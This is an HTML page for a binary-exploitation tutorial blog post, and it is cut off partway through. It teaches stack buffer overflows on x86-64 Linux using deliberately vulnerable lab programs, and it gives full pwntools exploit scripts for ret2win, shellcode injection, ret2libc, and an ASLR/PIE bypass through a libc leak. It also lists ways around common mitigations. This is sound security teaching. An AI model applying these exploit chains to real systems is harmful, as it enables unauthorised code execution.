@@ -1,0 +1,559 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Stack-Based Buffer Overflow  From Zero to Shell — dev null notes</title>
+        <meta name="description" content="There&#x27;s a moment every exploit developer remembers — the first time you type `python3 -c &quot;print(&#x27;A&#x27;*100)&quot;` into a terminal, pipe it into a binary, and watch `Segmentation fault` light up your screen. That crash is not a failure. That crash is a hello." />
+        <meta name="author" content="mr-dev-null" />
+        <meta name="keywords" content="pwn, c" />
+
+        <meta property="og:title" content="Stack-Based Buffer Overflow  From Zero to Shell" />
+        <meta property="og:description" content="There&#x27;s a moment every exploit developer remembers — the first time you type `python3 -c &quot;print(&#x27;A&#x27;*100)&quot;` into a terminal, pipe it into a binary, and watch `Segmentation fault` light up your screen. That crash is not a failure. That crash is a hello." />
+        <meta property="og:type" content="article" />
+        <meta property="og:url" content="https://mr-dev-null.github.io/pwn/stack-based-buffer-overflow-from-zero-to-shell.html" />
+        <meta property="og:site_name" content="dev null notes" />
+        <meta property="article:published_time" content="2026-07-01" />
+        <meta property="article:author" content="mr-dev-null" />
+        <meta property="article:tag" content="pwn" /><meta property="article:tag" content="c" />
+
+        <meta name="twitter:card" content="summary" />
+        <meta name="twitter:title" content="Stack-Based Buffer Overflow  From Zero to Shell" />
+        <meta name="twitter:description" content="There&#x27;s a moment every exploit developer remembers — the first time you type `python3 -c &quot;print(&#x27;A&#x27;*100)&quot;` into a terminal, pipe it into a binary, and watch `Segmentation fault` light up your screen. That crash is not a failure. That crash is a hello." />
+
+        <link rel="canonical" href="https://mr-dev-null.github.io/pwn/stack-based-buffer-overflow-from-zero-to-shell.html" />
+        <link rel="stylesheet" href="/style.css" />
+
+        <script type="application/ld+json">{"@context": "[https://schema.org](https://schema.org)", "@type": "BlogPosting", "headline": "Stack-Based Buffer Overflow  From Zero to Shell", "description": "There's a moment every exploit developer remembers — the first time you type `python3 -c \"print('A'*100)\"` into a terminal, pipe it into a binary, and watch `Segmentation fault` light up your screen. That crash is not a failure. That crash is a hello.", "datePublished": "2026-07-01", "author": {"@type": "Person", "name": "mr-dev-null"}, "publisher": {"@type": "Person", "name": "mr-dev-null"}, "url": "https://mr-dev-null.github.io/pwn/stack-based-buffer-overflow-from-zero-to-shell.html", "keywords": "pwn, c"}</script>
+    </head>
+    <body>
+        <div id="reading-progress"></div>
+        
+        <nav>
+            <a href="/index.html" class="logo">dev null notes</a>
+            <button class="nav-toggle" aria-expanded="false" aria-label="Toggle navigation">[menu]</button>
+            <div class="nav-links">
+                <a href="/pwn/index.html">pwn</a>
+                <a href="/re/index.html">re</a>
+                <a href="/programing/index.html">programing</a>
+                <a href="/mal/index.html">mal</a>
+                <a href="/web/index.html">web</a>
+                <a href="/index.html">home</a>
+                <a href="/about.html">about</a>
+            </div>
+        </nav>
+        <article>
+            <div class="article-header">
+                <span class="category">PWN</span>
+                <h1>Stack-Based Buffer Overflow  From Zero to Shell</h1>
+                <div class="meta">
+                    <span>July 01, 2026</span>
+                    <span>·</span>
+                    <span>20 min read</span>
+                    <span>·</span><span>#pwn · #c</span>
+                </div>
+            </div>
+
+            <div class="toc"><h4>Contents</h4><ol><li><a href="#introduction">Introduction</a></li><li><a href="#1-the-stack-a-precise-mental-model">1. The Stack: A Precise Mental Model</a></li><li><a href="#2-the-vulnerability-what-buffer-overflow-actually-means">2. The Vulnerability: What &quot;Buffer Overflow&quot; Actually Means</a></li><li><a href="#3-environment-setup">3. Environment Setup</a></li><li><a href="#4-lab-1-classic-ret2win-no-mitigations">4. Lab 1 — Classic ret2win (No Mitigations)</a></li><li><a href="#5-lab-2-shellcode-injection-nx-disabled">5. Lab 2 — Shellcode Injection (NX Disabled)</a></li><li><a href="#6-lab-3-ret2libc-nx-enabled-no-pie-no-canary">6. Lab 3 — ret2libc (NX Enabled, no PIE, no canary)</a></li><li><a href="#7-lab-4-full-aslr-pie-bypass-leak-ret2libc">7. Lab 4 — Full ASLR + PIE Bypass (Leak → ret2libc)</a></li><li><a href="#8-debugging-methodology">8. Debugging Methodology</a></li><li><a href="#9-how-mitigations-actually-work-and-their-limits">9. How Mitigations Actually Work (and Their Limits)</a></li><li><a href="#10-real-vulnerability-patterns">10. Real Vulnerability Patterns</a></li><li><a href="#11-putting-it-together-the-exploit-development-workflow">11. Putting It Together: The Exploit Development Workflow</a></li><li><a href="#whats-next">What&#x27;s Next</a></li></ol></div>
+
+            <div class="prose">
+                <p><em>by mrdevnull · binary exploitation series · part 1</em></p>
+<h2 id="introduction">Introduction</h2>
+<hr>
+<p>There's a moment every exploit developer remembers — the first time you type <code>python3 -c &quot;print(&#x27;A&#x27;*100)&quot;</code> into a terminal, pipe it into a binary, and watch <code>Segmentation fault</code> light up your screen. That crash is not a failure. That crash is a hello.</p>
+<p>This is the foundation. Everything in binary exploitation — heap feng shui, kernel ROP, FSOP — is downstream of understanding what happens on the stack when you write past the end of a buffer. We're going to tear it apart completely: the theory, the memory layout, the toolchain, and four progressively harder practical examples with full exploit scripts.</p>
+<p>No hand-waving. No skipping the hard parts.</p>
+<hr>
+<h2 id="1-the-stack-a-precise-mental-model">1. The Stack: A Precise Mental Model</h2>
+<p>Before you can exploit it, you need to see it clearly.</p>
+<p>The stack is a region of memory that grows <strong>downward</strong> on x86 and x86-64. High addresses at the top, low addresses at the bottom. Every time a function is called, the CPU pushes a new <strong>stack frame</strong> onto it. Every time a function returns, that frame is torn down.</p>
+<p>A stack frame contains, in order from high to low addresses:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>High addresses
+┌──────────────────────────────┐
+│  ... (caller&#x27;s frame)        │
+├──────────────────────────────┤  ← caller&#x27;s RSP before call
+│  return address (8 bytes)    │  ← pushed by CALL instruction
+├──────────────────────────────┤
+│  saved RBP (8 bytes)         │  ← pushed by function prologue
+├──────────────────────────────┤  ← RBP points here
+│  local variables             │
+│  buffers                     │
+│  ...                         │
+├──────────────────────────────┤  ← RSP points here
+│  (red zone / stack args)     │
+Low addresses</code></pre></div>
+<p>Two registers govern this:</p>
+<ul><li><strong>RSP</strong> (stack pointer): always points to the top of the stack — the lowest currently-used address.</li><li><strong>RBP</strong> (base pointer): points to the base of the current frame. Used to reference local variables at predictable negative offsets (<code>[rbp-0x10]</code>).</li></ul>
+<p>The <strong>function prologue</strong> sets this up:</p>
+<div class="code-wrapper"><div class="code-header"><span>asm</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>push rbp          ; save caller&#x27;s frame pointer
+mov  rbp, rsp     ; set our frame pointer
+sub  rsp, 0x50    ; allocate N bytes for locals</code></pre></div>
+<p>The <strong>function epilogue</strong> tears it down:</p>
+<div class="code-wrapper"><div class="code-header"><span>asm</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>leave             ; mov rsp, rbp; pop rbp
+ret               ; pop rip (loads return address into instruction pointer)</code></pre></div>
+<p>That <code>ret</code> instruction is your target. It pops whatever is sitting at <code>[RSP]</code> into <code>RIP</code> and jumps there. If you control what's at <code>[RSP]</code> at the moment <code>ret</code> executes, you control execution.</p>
+<hr>
+<h2 id="2-the-vulnerability-what-buffer-overflow-actually-means">2. The Vulnerability: What "Buffer Overflow" Actually Means</h2>
+<p>A buffer is a fixed-size region of memory. In C, when you write to a buffer, the language does not check bounds. There is no runtime exception. The CPU will faithfully copy bytes past the end of the buffer into whatever memory follows it — which, on the stack, is the saved RBP and the return address.</p>
+<p>The classic vulnerable function:</p>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>void vuln(void) {
+    char buf[64];
+    gets(buf);   // reads until newline, no length limit whatsoever
+}</code></pre></div>
+<p>Memory layout when <code>vuln()</code> is executing:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>┌──────────────────────┐ ← high
+│  return address      │  [rbp+0x08]
+├──────────────────────┤
+│  saved RBP           │  [rbp+0x00]
+├──────────────────────┤ ← RBP
+│  buf[63]             │
+│  ...                 │
+│  buf[0]              │  [rbp-0x40]
+└──────────────────────┘ ← RSP, low</code></pre></div>
+<p>When you feed 80 bytes of input:</p>
+<ul><li>bytes 0–63: fill <code>buf</code></li><li>bytes 64–71: overwrite saved RBP</li><li>bytes 72–79: overwrite the return address</li></ul>
+<p>When <code>vuln()</code> returns, <code>ret</code> pops your 8 bytes into RIP. If those bytes are a valid address, execution jumps there. That's the primitive.</p>
+<hr>
+<h2 id="3-environment-setup">3. Environment Setup</h2>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># Ubuntu 22.04 / Debian — install everything you need
+sudo apt update
+sudo apt install -y gcc gdb python3 python3-pip pwndbg nasm binutils
+
+# pwntools
+pip3 install pwntools
+
+# pwndbg (better gdb)
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg &amp;&amp; ./setup.sh
+
+# checksec — inspect binary protections
+pip3 install checksec</code></pre></div>
+<p>Compile with protections <strong>disabled</strong> for the first examples, then we'll enable them one by one:</p>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># Disable all mitigations: no canary, no PIE, executable stack (NX off)
+gcc -o vuln vuln.c \
+    -fno-stack-protector \
+    -no-pie \
+    -z execstack \
+    -m64
+
+# Check what&#x27;s enabled
+checksec --file=vuln</code></pre></div>
+<p><code>checksec</code> output to understand:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX disabled
+PIE:      No PIE</code></pre></div>
+<p>Each of these is a mitigation we'll encounter and defeat:</p>
+<p>| Flag | Meaning | |------|---------| | Stack canary | Random value before return address; crashes if tampered | | NX / DEP | Stack memory marked non-executable; blocks shellcode | | PIE | Binary loaded at random base address; breaks hardcoded addresses | | Full RELRO | GOT made read-only; blocks GOT overwrites |</p>
+<hr>
+<h2 id="4-lab-1-classic-ret2win-no-mitigations">4. Lab 1 — Classic ret2win (No Mitigations)</h2>
+<h3 id="source">Source</h3>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>// lab1.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win(void) {
+    puts(&quot;[*] you called win()&quot;);
+    system(&quot;/bin/sh&quot;);
+}
+
+void vuln(void) {
+    char buf[64];
+    printf(&quot;input: &quot;);
+    gets(buf);
+}
+
+int main(void) {
+    vuln();
+    return 0;
+}</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gcc -o lab1 lab1.c -fno-stack-protector -no-pie -z execstack</code></pre></div>
+<h3 id="finding-the-offset">Finding the Offset</h3>
+<p>Open GDB with pwndbg:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gdb ./lab1</code></pre></div>
+<p>Generate a De Bruijn (cyclic) pattern — a string where every 8-byte substring is unique, so you can find the exact offset from the crash:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; cyclic 200
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaaa</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; run
+input: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaaa</code></pre></div>
+<p>The crash shows:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>RIP: 0x6161616161616166 (&#x27;faaaaaaa&#x27;)</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; cyclic -l 0x6161616161616166
+72</code></pre></div>
+<p>Offset is <strong>72 bytes</strong>. That means: 64 bytes buffer + 8 bytes saved RBP = 72 bytes of padding, then 8 bytes of return address.</p>
+<p>Verify with <code>objdump</code>:</p>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>objdump -d lab1 | grep -A5 &#x27;&lt;win&gt;&#x27;
+# 0x0000000000401196 &lt;win&gt;:</code></pre></div>
+<p>Or in pwndbg:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; p win
+$1 = {&lt;text variable, no debug info&gt;} 0x401196 &lt;win&gt;</code></pre></div>
+<h3 id="exploit">Exploit</h3>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># exploit_lab1.py
+from pwn import *
+
+elf = ELF(&#x27;./lab1&#x27;)
+p   = process(&#x27;./lab1&#x27;)
+
+offset   = 72
+win_addr = elf.symbols[&#x27;win&#x27;]
+
+log.info(f&quot;win @ {hex(win_addr)}&quot;)
+
+payload = flat(
+    b&#x27;A&#x27; * offset,
+    p64(win_addr)
+)
+
+p.sendlineafter(b&#x27;input: &#x27;, payload)
+p.interactive()</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>python3 exploit_lab1.py
+# [*] you called win()
+# $ whoami
+# mrdevnull</code></pre></div>
+<p>Done. You've overwritten the return address and redirected execution to <code>win()</code>.</p>
+<hr>
+<h2 id="5-lab-2-shellcode-injection-nx-disabled">5. Lab 2 — Shellcode Injection (NX Disabled)</h2>
+<p>When there's no <code>win()</code> function, you inject your own code. This requires NX to be off so the stack is executable.</p>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>// lab2.c
+#include &lt;stdio.h&gt;
+
+void vuln(void) {
+    char buf[128];
+    printf(&quot;input: &quot;);
+    read(0, buf, 256);  // reads 256 bytes into 128-byte buffer
+}
+
+int main(void) {
+    vuln();
+    return 0;
+}</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gcc -o lab2 lab2.c -fno-stack-protector -no-pie -z execstack</code></pre></div>
+<p>The plan:</p>
+<ol><li>Find the address of <code>buf</code> on the stack</li><li>Write shellcode into <code>buf</code></li><li>Overwrite return address with address of <code>buf</code></li></ol>
+<h3 id="finding-the-buffer-address">Finding the Buffer Address</h3>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gdb ./lab2
+pwndbg&gt; break vuln
+pwndbg&gt; run &lt; &lt;(python3 -c &quot;import sys; sys.stdout.buffer.write(b&#x27;A&#x27;*200)&quot;)
+pwndbg&gt; x/20gx $rsp</code></pre></div>
+<p>Look for your <code>0x4141414141414141</code> pattern and find where <code>buf</code> starts relative to RBP. Or use:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; info frame</code></pre></div>
+<p>Note <code>buf</code> is at <code>rbp-0x80</code> (128 bytes = 0x80).</p>
+<h3 id="exploit">Exploit</h3>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># exploit_lab2.py
+from pwn import *
+
+context.arch = &#x27;amd64&#x27;
+context.os   = &#x27;linux&#x27;
+
+p = process(&#x27;./lab2&#x27;)
+
+# pwntools built-in shellcode: execve(&quot;/bin/sh&quot;, NULL, NULL)
+shellcode = asm(shellcraft.sh())
+
+# gdb: buf is at rbp-0x80, return addr at rbp+0x08
+# total offset = 0x80 + 0x08 = 136 bytes
+offset = 136
+
+# We need the runtime address of buf.
+# With no PIE and no ASLR (or after leaking), we get it from /proc or gdb.
+# For ASLR disabled: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+#
+# In gdb: p &amp;buf -&gt; 0x7fffffffe3a0  (example)
+buf_addr = 0x7fffffffe3a0  # replace with your value from gdb
+
+payload = flat(
+    shellcode,
+    b&#x27;A&#x27; * (offset - len(shellcode)),
+    p64(buf_addr)
+)
+
+p.sendafter(b&#x27;input: &#x27;, payload)
+p.interactive()</code></pre></div>
+<blockquote><p><strong>Note</strong>: ASLR makes <code>buf_addr</code> change every run. To work around this without a leak you can disable ASLR for practice (<code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code>), or use a NOP sled (pad before shellcode with <code>\x90</code> bytes so you only need to land anywhere in a wide window).</p></blockquote>
+<h3 id="nop-sled-variant">NOP Sled Variant</h3>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>nop_sled  = b&#x27;\x90&#x27; * 100
+shellcode = asm(shellcraft.sh())
+padding   = b&#x27;A&#x27; * (offset - len(nop_sled) - len(shellcode))
+
+# Point return address anywhere into the NOP sled
+payload = nop_sled + shellcode + padding + p64(buf_addr + 10)</code></pre></div>
+<hr>
+<h2 id="6-lab-3-ret2libc-nx-enabled-no-pie-no-canary">6. Lab 3 — ret2libc (NX Enabled, no PIE, no canary)</h2>
+<p>NX is on. The stack is not executable. We can't run shellcode on the stack. Instead, we return into existing executable code — specifically into <code>libc</code>'s <code>system()</code> function with <code>/bin/sh</code> as the argument.</p>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gcc -o lab3 lab3.c -fno-stack-protector -no-pie
+# NX is ON by default now (no -z execstack)
+checksec --file=lab3
+# NX: NX enabled ✓</code></pre></div>
+<p>On x86-64 Linux, the first argument to a function is passed in <strong>RDI</strong>. So the calling convention we need:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>RDI = address of &quot;/bin/sh&quot; string
+RSP → system()</code></pre></div>
+<p>To set RDI, we need a ROP gadget: <code>pop rdi; ret</code>. This pops the next value off the stack into RDI, then returns to whatever comes after it.</p>
+<h3 id="finding-gadgets">Finding Gadgets</h3>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># ROPgadget
+pip3 install ropgadget
+ROPgadget --binary lab3 | grep &quot;pop rdi&quot;
+# 0x00000000004011d3 : pop rdi ; ret
+
+# or with pwntools ropper
+ropper -f lab3 --search &quot;pop rdi&quot;</code></pre></div>
+<h3 id="finding-libc-addresses">Finding libc Addresses</h3>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># Find which libc is linked
+ldd lab3
+# libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6
+
+# Get addresses of system() and &quot;/bin/sh&quot; in libc
+readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep &quot; system@@&quot;
+strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;</code></pre></div>
+<p>With no PIE, <code>lab3</code> is at a fixed base. But libc IS randomized by ASLR. For now (no ASLR) or with a leak, the base is known.</p>
+<h3 id="exploit">Exploit</h3>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># exploit_lab3.py
+from pwn import *
+
+elf  = ELF(&#x27;./lab3&#x27;)
+libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)
+p    = process(&#x27;./lab3&#x27;)
+
+offset = 72  # same as before for a 64-byte buf
+
+# With no ASLR: libc base is fixed
+# In real exploit: compute from leak (lab4 shows this)
+libc.address = 0x00007ffff7dc4000  # get from: gdb, vmmap, or /proc/PID/maps
+
+pop_rdi  = 0x00000000004011d3          # from ROPgadget
+bin_sh   = next(libc.search(b&#x27;/bin/sh&#x27;))
+system   = libc.sym[&#x27;system&#x27;]
+
+# x86-64 ABI: stack must be 16-byte aligned before CALL.
+# &#x27;system&#x27; internally does MOVAPS which requires alignment.
+# Add a &#x27;ret&#x27; gadget to adjust alignment by 8 bytes.
+ret_gadget = 0x000000000040101a       # a bare &#x27;ret&#x27; from the binary
+
+log.info(f&quot;pop rdi  @ {hex(pop_rdi)}&quot;)
+log.info(f&quot;/bin/sh  @ {hex(bin_sh)}&quot;)
+log.info(f&quot;system() @ {hex(system)}&quot;)
+
+payload = flat(
+    b&#x27;A&#x27; * offset,
+    p64(ret_gadget),   # alignment fix
+    p64(pop_rdi),
+    p64(bin_sh),
+    p64(system),
+)
+
+p.sendlineafter(b&#x27;input: &#x27;, payload)
+p.interactive()</code></pre></div>
+<p>The <strong>stack alignment</strong> issue trips up many beginners. <code>system()</code> uses <code>movaps</code> (aligned move) internally, which segfaults on unaligned RSP. Adding a bare <code>ret</code> gadget before the chain shifts RSP by 8, restoring 16-byte alignment.</p>
+<hr>
+<h2 id="7-lab-4-full-aslr-pie-bypass-leak-ret2libc">7. Lab 4 — Full ASLR + PIE Bypass (Leak → ret2libc)</h2>
+<p>This is where the real game starts. PIE randomizes the binary base. ASLR randomizes libc. Every run, every address is different. You need a <strong>leak</strong>.</p>
+<h3 id="strategy">Strategy</h3>
+<ol><li>Use the overflow to call <code>puts(got[&#x27;puts&#x27;])</code> — this prints the <em>runtime address</em> of <code>puts</code> in libc</li><li>Parse the leak to compute libc base: <code>libc_base = leaked_puts - libc.sym[&#x27;puts&#x27;]</code></li><li>Send a second payload (via a <code>main</code> re-call) with correct addresses now computed</li></ol>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>// lab4.c — same vuln, no win(), all mitigations except canary
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vuln(void) {
+    char buf[64];
+    printf(&quot;input: &quot;);
+    fflush(stdout);
+    read(0, buf, 256);
+}
+
+int main(void) {
+    vuln();
+    return 0;
+}</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gcc -o lab4 lab4.c -fno-stack-protector -pie
+checksec --file=lab4
+# NX: enabled, PIE: enabled</code></pre></div>
+<p>With PIE, you cannot use static gadget addresses. But leaked addresses are runtime addresses, and the offset between symbols within the same binary/library is always constant regardless of base.</p>
+<h3 id="two-stage-exploit">Two-Stage Exploit</h3>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># exploit_lab4.py
+from pwn import *
+
+elf  = ELF(&#x27;./lab4&#x27;)
+libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)
+p    = process(&#x27;./lab4&#x27;)
+
+offset = 72
+
+# ── Stage 1: leak libc via puts(got[&#x27;puts&#x27;]) ──────────────────────────
+# We need gadgets from the binary. With PIE, we must leak binary base first.
+# Trick: the binary&#x27;s LOAD segment is mapped at page-aligned address.
+# We can use the PLT (which is position-independent) and GOT.
+
+# pwntools resolves PIE symbols at load time — use elf.plt / elf.got
+# which contain the OFFSET from base. We need to add elf.address (0 until leaked).
+
+# With PIE: first leak the binary base via an info leak if possible.
+# Alternatively: leak via the PLT/GOT directly since PLT is executable
+# and the dynamic linker resolves GOT lazily.
+
+# Find gadgets in the binary — with PIE, gadgets are at (elf.address + offset)
+# After loading, pwntools gives you raw offsets in elf.symbols.
+
+# We need: pop rdi; ret — search at load time
+rop = ROP(elf)
+pop_rdi = rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]
+ret     = rop.find_gadget([&#x27;ret&#x27;])[0]
+
+# puts@plt will call the real puts (resolving via GOT)
+# puts@got contains the runtime address of puts in libc
+puts_plt = elf.plt[&#x27;puts&#x27;]
+puts_got = elf.got[&#x27;puts&#x27;]
+main     = elf.sym[&#x27;main&#x27;]
+
+log.info(f&quot;pop rdi  @ {hex(pop_rdi)}&quot;)
+log.info(f&quot;puts@plt @ {hex(puts_plt)}&quot;)
+log.info(f&quot;puts@got @ {hex(puts_got)}&quot;)
+
+# Leak payload: call puts(got[&#x27;puts&#x27;]), then return to main for stage 2
+leak_payload = flat(
+    b&#x27;A&#x27; * offset,
+    p64(ret),          # alignment
+    p64(pop_rdi),
+    p64(puts_got),
+    p64(puts_plt),
+    p64(main),         # loop back for second input
+)
+
+p.sendafter(b&#x27;input: &#x27;, leak_payload)
+
+# Parse the leaked address (puts prints until null byte, 6 bytes on x86-64)
+p.recvuntil(b&#x27;input: &#x27;)  # skip first prompt
+leaked = p.recvline().strip()
+leaked_puts = u64(leaked.ljust(8, b&#x27;\x00&#x27;))
+log.success(f&quot;leaked puts @ {hex(leaked_puts)}&quot;)
+
+# ── Stage 2: compute bases, send shell payload ────────────────────────
+libc.address = leaked_puts - libc.sym[&#x27;puts&#x27;]
+log.success(f&quot;libc base  @ {hex(libc.address)}&quot;)
+
+bin_sh  = next(libc.search(b&#x27;/bin/sh&#x27;))
+system  = libc.sym[&#x27;system&#x27;]
+
+shell_payload = flat(
+    b&#x27;A&#x27; * offset,
+    p64(ret),
+    p64(pop_rdi),
+    p64(bin_sh),
+    p64(system),
+)
+
+p.sendafter(b&#x27;input: &#x27;, shell_payload)
+p.interactive()</code></pre></div>
+<p>This is the <strong>canonical CTF exploit pattern</strong>: leak → compute base → rop to shell. Master this and you've mastered the foundation of userland exploitation.</p>
+<hr>
+<h2 id="8-debugging-methodology">8. Debugging Methodology</h2>
+<p>These are the GDB workflows you'll use constantly:</p>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># Set a breakpoint right before the return
+gdb ./lab1
+pwndbg&gt; break *vuln+42    # after gets() returns
+pwndbg&gt; run
+
+# Inspect the stack at the moment of ret
+pwndbg&gt; x/20gx $rsp        # show 20 qwords from RSP
+pwndbg&gt; info frame           # show frame info: saved regs, frame addr
+
+# Step to the ret instruction and watch RIP change
+pwndbg&gt; ni                   # next instruction (no follow calls)
+
+# Print a symbol&#x27;s address
+pwndbg&gt; p &amp;win
+pwndbg&gt; p system
+
+# Find strings
+pwndbg&gt; search -s &quot;/bin/sh&quot;
+
+# Find ROP gadgets
+pwndbg&gt; rop --grep &quot;pop rdi&quot;
+
+# Inspect mappings (ASLR, libc base)
+pwndbg&gt; vmmap
+
+# Dump memory as hex + ASCII
+pwndbg&gt; hexdump $rsp 64</code></pre></div>
+<hr>
+<h2 id="9-how-mitigations-actually-work-and-their-limits">9. How Mitigations Actually Work (and Their Limits)</h2>
+<h3 id="stack-canary">Stack Canary</h3>
+<p>The compiler inserts a random 8-byte value (the canary) between local variables and the saved RBP/return address. Before <code>ret</code>, it checks that the canary is unchanged. If not, it calls <code>__stack_chk_fail()</code> which terminates the program.</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>┌──────────────────────┐
+│  return address      │
+├──────────────────────┤
+│  saved RBP           │
+├──────────────────────┤
+│  canary (8 bytes)    │ ← random, checked before ret
+├──────────────────────┤
+│  buf[]               │
+└──────────────────────┘</code></pre></div>
+<p><strong>Bypasses</strong>: format string to leak the canary, then include correct value in overflow. Or: overwrite past canary entirely if you also know its value.</p>
+<h3 id="nx-dep">NX / DEP</h3>
+<p>The OS marks stack pages as non-executable (via the NX bit in page tables). Any attempt to jump to stack memory triggers a page fault → SIGSEGV.</p>
+<p><strong>Bypass</strong>: ROP — you don't inject new code, you chain together existing code already in executable memory.</p>
+<h3 id="pie-position-independent-executable">PIE (Position Independent Executable)</h3>
+<p>The binary is compiled as a shared object. The kernel maps it at a random base address each run. All addresses within the binary are randomized together (same relative offset, random base).</p>
+<p><strong>Bypass</strong>: any memory disclosure (format string, use-after-free read, etc.) that lets you read a pointer inside the binary, then subtract the known offset to get the base.</p>
+<h3 id="aslr">ASLR</h3>
+<p>The kernel randomizes the base address of stack, heap, and shared libraries independently. On x86-64, only the upper bits are randomized (typically 28 bits of entropy for mmap, 20 for stack).</p>
+<p><strong>Bypass</strong>: information leak of any libc pointer (function pointers in memory, GOT entries, <code>__libc_start_main</code> return address on the stack). One leaked address → full libc base → all libc symbols known.</p>
+<hr>
+<h2 id="10-real-vulnerability-patterns">10. Real Vulnerability Patterns</h2>
+<p>Pure <code>gets()</code> barely exists in the wild. Here's what real overflow triggers look like:</p>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>// Pattern 1: memcpy with user-controlled length
+void parse_packet(char *data, size_t user_len) {
+    char buf[512];
+    memcpy(buf, data, user_len);  // user_len &gt; 512 = overflow
+}
+
+// Pattern 2: sprintf into fixed buffer
+void build_path(char *user_input) {
+    char path[256];
+    sprintf(path, &quot;/var/www/%s&quot;, user_input);  // overflow if user_input &gt; ~246 bytes
+}
+
+// Pattern 3: off-by-one (fence-post error)
+void copy_str(char *src) {
